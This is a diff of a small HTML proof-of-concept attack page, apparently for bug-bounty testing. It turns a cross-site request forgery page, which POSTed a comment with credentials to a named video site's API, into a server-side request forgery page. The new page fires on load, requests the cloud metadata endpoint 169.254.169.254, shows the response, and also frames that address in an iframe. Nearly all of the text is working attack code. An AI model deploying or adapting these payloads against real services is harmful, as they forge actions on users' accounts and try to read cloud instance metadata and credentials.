@@ -4,14 +4,13 @@
 <head>
  <script src=/jquery-3.4.1.min.js></script>
 </head>
-<title>CSRF FOR COMMENT</title>
+<title>SSRF POC</title>
  <script>
 	function csrf(){
 		var data = "comment=csrf+for+test";
 		$.ajax({
-			    url : 'https://www.magisto.com/api/video/comments/P14CZgkQE20vQg5hCzE',
-			    type : 'POST',
-			    data:data,
+			    url : 'https://169.254.169.254/latest/meta-data/ ',
+			    type : 'GET',
 			    headers: {
         			"X-Requested-With":'XMLHttpRequest'
     			 },
@@ -19,7 +18,7 @@
 			     withCredentials: true
 			 },
 			    success : function(response, textStatus, jqXhr) {
-				alert("Successfully !Your account's loggin userName have been modified!");
+				$("#result").val(response);
 			    },
 			    error : function(jqXHR, textStatus, errorThrown) {
 				// log the error to the console
@@ -31,8 +30,10 @@
         });
 	}
  </script>
+	<body onload="csrf()">
  click the button to csrf comment!
 <button id="csrf" onclick="csrf()">csrf for comment</button>
-<iframe src="https://hackerone-johnstone.test.mattermost.cloud/api/v4/teams"></iframe>
+<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+<textarea id="result"></textarea>
 </body>
 </html>
